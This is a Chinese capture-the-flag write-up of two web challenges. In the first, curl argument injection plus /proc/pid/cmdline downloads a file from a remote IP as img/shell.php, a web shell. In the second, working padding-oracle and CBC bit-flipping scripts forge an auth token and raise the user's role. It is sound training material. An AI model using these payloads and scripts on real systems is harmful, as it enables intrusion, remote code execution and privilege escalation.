# 思路

# 思路

### **[N1CTF2020]DockerManager**

index.php没有啥用处，view.php大概就是exec执行了

curl —connect-timeout 10 ‘ . $host_addr . ‘-g’ . $cert . $key . $cacert;

后三个参数已经写死了，只有$host_addr在后面拼接了?all=true

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled.png)

但是截断是发生在escapeshellarg()中的，包裹的引号都仍然存在

那么接下来的思路就是利用curl来实现命令执行或者实现某些操作，这就和nmap 的参数写马和npm包反弹shell思路类似

-一个字母的选项是可以在引号的包裹中正常使用的，这里利用了-K，作用是读取一个文件作为curl的输入参数，语法要求

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%201.png)

也就是将curl中的参数写入文件中，那么问题就转移到了如何在服务器上制作出一个对应的文件

那么顶级的利用思路来了

****/proc/`pid`/cmdline****

当使用exec时，会新开一个进程来执行exec的内容，那么cmdline里的内容就是之前的$cmd，将$cmd中的参数污染为-K能够理解的格式，就可以实现

现在只需要能够命中pid，curl发起时间过短要怎么命中呢，这里有一个知识点

Linux的随机数产生接口/dev/urandom ，会不断的产生随机数，将-K的值指定为这个接口，就让curl去读取就会因为一直无法读取结束，而实现在proc中常驻，从而实现爆破pid值

第一次传参为,使curl常驻

host=-K/dev/urandom%00&cert=1%0a%0aurl="https://49.232.206.37/wumonster.txt"
output="img/shell.php"%0a%0a

?host=-K/dev/urandom%00&cacert=111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl="http://49.232.206.37/wumonster.txt"%0aoutput="img/shell.php"%0a%0a%0a%0a%0a%0a%0a

第二次为

host=-K/proc/pid/cmdline

原本一直没有命中到，直到把脚本里的:81去掉，不是很明白BUU的环境

```python
from time import sleep
import requests
for i in range(1, 1000):
    r = requests.get("http://7db9a488-bdfb-43ef-967b-5ea643b0cf6a.node4.buuoj.cn/view.php?host=-K/proc/" + str(i) + "/cmdline%00")
    if r.status_code != 200:
        sleep(1)
        r = requests.get("http://7db9a488-bdfb-43ef-967b-5ea643b0cf6a.node4.buuoj.cn/view.php?host=-K/proc/" + str(
            i) + "/cmdline%00")
    print(i)
    print(r.text)
```

反弹shell来进行交互

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%202.png)

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%203.png)

直接python

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%204.png)

ps：原本的readflag程序交互时间很短

trap “” 14的原理大概是这样的

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%205.png)

## ****padding-oracle attack****

```python
import time

import requests
import base64
import json

host = "0b940989-8cd4-4990-955c-62272a7ba9a5.node2.buuoj.cn.wetolink.com"
port = 82

def padding_oracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    signed_key_decoded = base64.b64decode(signed_key)
    #print(signed_key_decoded)
    url = "http://" + host + ":" + str(port) + "/frontend/api/v1/user/info"
    #print(signed_key_decoded)
    # b'ICxkSingDanceRaPY\xac\xad>\xe4h]\xd0[\xfa(_\xb5*N(&\xc8\xc62\xd1\x06>M\xe2\xb7\xdaLEz\x8cd\xfd\x8e\xb2\xde\x19\xbf\x84\x15\xbe\x88\xb8\xae*\xfb\x0c)#\xbeT\xf0\x89\x14\x8e\xce\x96\xb4\xbf\x1aV\xbcU\x98ns;\xf9\xfb\xcb\xf7Z\xb0\x88\x1c\xd4\xa6D\xd2\xa5\x00^\x03\xbd\x1e\xa5\xd1\x19Tf=3g\xcd\xd7\x88'
    # print(len(signed_key_decoded))
    # 112/16=7
    N = 16

    total_plain = ''
    for block in range(0, len(signed_key_decoded) // 16 - 1):
        token = ''
        get = b""
        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]
        for i in range(1, N+1):
            for j in range(0, 256):
                time.sleep(0.1)
                padding = b"".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))])
                c = b'\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher
                #print(c)
                token = base64.b64encode(c)
                user_key_json_decode['signed_key'] = token.decode("utf-8")
                header = {'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))}
                res = requests.get(url, headers=header)
                #print(res.text, j)
                if res.json()['code'] != 205:
                    get = (j ^ i).to_bytes(1, 'little') + get
                    print(get, i)
                    break

        plain = b"".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)])
        print(plain.decode("utf-8"), "block=%d" % block)
        total_plain += plain.decode("utf-8")
        print(total_plain)

    return total_plain

plain_text = padding_oracle(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWldiMU1CUTNxVEplL2lGcExsbTlUNGxFQkZrOFNmQ1lvRW96MTdMQlpjV25VOS92WkxuMHBiVVliakF3RUJqV0s1ZldXb3ZIeG1JRG9wRHFHTVFjQ0tBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiMVU1Rm0zWGk3VE12dllGaFZxQkluVWZ2MGJxNEFpTWYiLCJleHBpcmVfaW4iOjE1NzA1MjU0MTB9")
print(plain_text)
```

## ****cbc字节翻转攻击****

```python
import time

import requests
import base64
import json

host = "0b940989-8cd4-4990-955c-62272a7ba9a5.node2.buuoj.cn.wetolink.com"
port = 82

def cbc_attack(key, block, origin_content, target_content):
    user_key_decode = base64.b64decode(key)
    #print(user_key_decode)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    #print(signed_key)
    cipher_o = base64.b64decode(signed_key)
    #print(cipher_o)
    if block > 0:
        iv_prefix = cipher_o[:block * 16]
    else:
        iv_prefix = b''
    iv = cipher_o[block * 16:16 + block * 16]
    cipher = cipher_o[16 + block * 16:]
    iv_array = bytearray(iv)
    for i in range(0, 16):
        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])
    iv = bytes(iv_array)
    #print(iv)
    user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher).decode('utf-8')
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))

def get_user_info(key):
    r = requests.post("http://" + host + ":" + str(port) + "/frontend/api/v1/user/info", headers={"Key": key})
    if r.json()['code'] == 100:
        print("获取成功！")
    return r.json()['data']

def modify_role_plain(key, role):
    user_key_decode = base64.b64decode(user_key)
    user_key_json_decode = json.loads(user_key_decode)
    user_key_json_decode['role'] = role
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), 'utf-8')).decode('utf-8')

user_key = cbc_attack(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVS\
HNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4Lysx\
WldiMU1CUTNxVEplL2lGcExsbTlUNGxFQkZrOFNmQ1lvRW96MTdMQlp\
jV25VOS92WkxuMHBiVVliakF3RUJqV0s1ZldXb3ZIeG1JRG9wRHFHTVF\
jQ0tBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiMVU1\
Rm0zWGk3VE12dllGaFZxQkluVWZ2MGJxNEFpTWYiLCJleHBpcmVfaW4iO\
jE1NzA1MjU0MTB9", 0, '{"role":3,"user_', '{"role":1,"user_')
user_key = modify_role_plain(user_key, 1)
print(user_key)
```

### ****[CISCN2019 东北赛区 Day2 Web3]Point System****

Robots.txt

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%206.png)

访问后发现是一个API的文档

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%207.png)

存在注册接口

测试之后其实是没有用的因为注册目标是127.0.01

burp抓取了一个登录的包改成了注册

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%208.png)

登录时先向/frontend/api/v1/user/login拿了个token

{"code":100,"data":{"token":"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm1HOUNpQnpjcDJ3Y0NXT3FSbGpjWFNlUTBOUm9TVzF1enlHRVFoZE04c1pwdC9pako4WGhCMGltMEVDbkRVWk1tWkE5dVB1N09xajhzdkxncXZBc1FRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiZ2VpU216WUdOM3pCUWxnaDRHR1ZRUzlSendZankwaFMiLCJleHBpcmVfaW4iOjE2NjQ5OTc0MjB9"}}

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%209.png)

将token带上后访问/frontend/api/v1/user/info

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2010.png)

token一眼base64

{"signed_key":"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZmG9CiBzcp2wcCWOqRljcXSeQ0NRoSW1uzyGEQhdM8sZpt/ijJ8XhB0im0ECnDUZMmZA9uPu7Oqj8svLgqvAsQQ==","role":3,"user_id":1,"payload":"geiSmzYGN3zBQlgh4GGVQS9RzwYjy0hS","expire_in":1664997420}

signed_key再base64

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2011.png)

ICxkSingDanceRap是这个AES CBC的IV后面的是加密过的后续密文

用padding-oracle攻击的脚本来跑一下,CBC翻转攻击一下，主要是要用登录抓的包返回的token值来攻击拿到反转后的结果将其写入cookie就可以登录了

![Untitled](%E6%80%9D%E8%B7%AF%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2012.png)

之后就是FFMpeg的视频处理漏洞